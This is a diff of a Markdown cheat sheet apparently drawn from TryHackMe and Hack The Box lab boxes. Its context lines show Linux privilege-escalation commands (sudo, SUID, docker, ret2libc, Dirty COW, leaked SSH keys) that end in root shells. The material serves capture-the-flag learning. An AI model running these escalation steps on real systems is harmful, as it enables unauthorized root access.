@@ -12,7 +12,7 @@ math: true
 ## SUID binaries for privilege escalation:
 
 
-## tryhackme linux priv esc arena:
+### tryhackme linux priv esc arena:
 
 
 Running `sudo -l` returns a few options of things we can run so we will find a way to exploit each one:
@@ -98,18 +98,17 @@ TCM@debian:~$ chmod +x /home/user/overwrite.sh
 TCM@debian:~$ /tmp/bash -p
 bash-4.1# whoami
 root
-
-
 ```
 
-#### Litlle trick with getcap and python to priv esc:
+#### little trick with crontab and getcap to get root:
+
 ```bash
 TCM@debian:~$ getcap -r / 2>/dev/null
 TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 root@debian:~#
 ```
 
-#### Using SUID envoronment variables:
+#### Using SUID envoronment variables:
 ```bash
 TCM@debian:~$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
 TCM@debian:~$ gcc /tmp/service.c -o /tmp/service
@@ -125,7 +124,7 @@ bash-4.1# whoami
 root
 ```
 
-## exploiting systemctl to gain a root shell - hack the box jarvis:
+### exploiting systemctl to gain a root shell - hack the box jarvis:
 ```bash
 pepper@jarvis:~$ find / -perm -4000 2> /dev/null
 
@@ -161,7 +160,7 @@ d41d8cd[redacted]
 ```
 
 
-## tryhackme pentest box, the most simlpe priv esc with `sudo -l` to show us we can run anything as root so we can simply su.
+### tryhackme pentest box, the most simlpe priv esc with `sudo -l` to show us we can run anything as root so we can simply su.
 
 ```bash
 kay@basic2:~$ sudo -l
@@ -176,9 +175,7 @@ root@basic2:/home/kay# whoami
 root
 ```
 
-## openadmin htb - using nano to get a shell:
-
- ROOT
+### openadmin htb - using nano to get a shell:
 
 We run `sudo -l` as always when we are trying to priv esc to see if we can run anything as sudo.
 ```bash
@@ -215,7 +212,7 @@ root.txt: not found
 # cat root.txt
 2f907ed450b361b2c2bf4e8795d5b561
 ```
-## using jjs to priv esc - hack the box mango
+### using jjs to priv esc - hack the box mango
 
 When we get a shell on the box we run `linenum.sh` to check for anything interesting.
 
@@ -252,7 +249,7 @@ jjs> admin@mango:/home/admin$ wc -c /tmp/fieldraccoon.txt
 ```
 From this we can see that we succesfully copy the root flag into our tmp directory and are able to read it.
 
-## tryhackme lazy-admin box - sudo -l - perl priv-esc
+### tryhackme lazy-admin box - sudo -l - perl priv-esc
 
 ```bash
 www-data@THM-Chal:/home/itguy$ sudo -l
@@ -298,7 +295,7 @@ THM{6637f41d0177b6f37cb20d775124699f}
 
 ## Other:
 
-## Priv esc with mounting file system on docker:
+### Priv esc with mounting file system on docker:
 
 Running `id` confirms that the user is part of a docker group, we will see if we can exploit this.
 
@@ -331,7 +328,7 @@ bash-4.4# cat root.txt
 0385b6629b30f8a673f7bb279fb1570b
 bash-4.4#
 ```
-## priv esc mounting backup image with password ciphertext key brute force -hack the box forward-slash:
+### priv esc mounting backup image with password ciphertext key brute force -hack the box forward-slash:
 
 When we enumerate we find a file where it seems to be the encryption method for a ciphertext. We can make a script to brute force this:
 ```python
@@ -492,7 +489,7 @@ kay@basic2:~$
 ```
 And here we managed to get into the system as the user.
 
-## Git show on git logs to reveal a private ssh key - devOops box htb
+### Git show on git logs to reveal a private ssh key - devOops box htb
 
 as we ssh we find that there is a git directory in `/home/roosa/work/blogfeed/.git` we run `git log` to see if we find anything interesting and luckily we do.
 ```bash
@@ -504,7 +501,7 @@ Date:   Mon Mar 19 09:33:06 2018 -0400
 ```
 This means that the user had an old ssh key reverted(its the root ssh key) so we need to try and find a way to get this. We run `git show 33e87c312c08735a02fa9c796021a4a3023129ad `and it shows us the root key, We copy it to our box once again, give it appropriate permissions and ssh as root.
 
-## simple ret2libc exploit to get a root shell
+### simple ret2libc exploit to get a root shell
 
 We find an SUID binary in /home/ayush/.binary, its called rop
 we run it to see what it does, basically it just takes our input and outputs it.
@@ -566,7 +563,7 @@ Then we simply run This command to exploit the binary and get a root shell and r
 ./rop `python /tmp/exploit.py`
 ```
 
-## root shell via php file execution as root - htb cronos:
+### root shell via php file execution as root - htb cronos:
 
 By running linenum.sh on the system we find an interesting file on it called `/etc/crontab`.
 
@@ -636,7 +633,7 @@ root
 # cat /root/root.txt
 1703b8a3c9a8dde879942c79d02fd3a0
 ```
-## priv esc with journalctl -  hack the box traverxec root:
+### priv esc with journalctl -  hack the box traverxec root:
 
 We find an interesting file in `bin` called `server-stats.sh` so we run it to see what its doing.
 
@@ -704,7 +701,7 @@ After the script has executed we type `!/bin/bash` which will give us a shell.
 
 Overall this wasnt the greatest way to do this as without gtfobins it required pure guesswork as the shell wouldnt work if the window wasn't minimised.
 
-## Using dirtycow
+### Using dirtycow
 
 we can test to see if the kernel for that machine is vulnrable by running an exploit suggestor and if it comes up with dirty cow we can abuse it like this:
 ```bash
@@ -733,7 +730,7 @@ root@debian:/home/user# id && whoami
 uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
 root
 ```
-## Using touch to make an executable file name - hack the box networed:
+### Using touch to make an executable file name - hack the box networed:
 
 After gaining a shell we find a file which involves this interesting line:
 ```bash
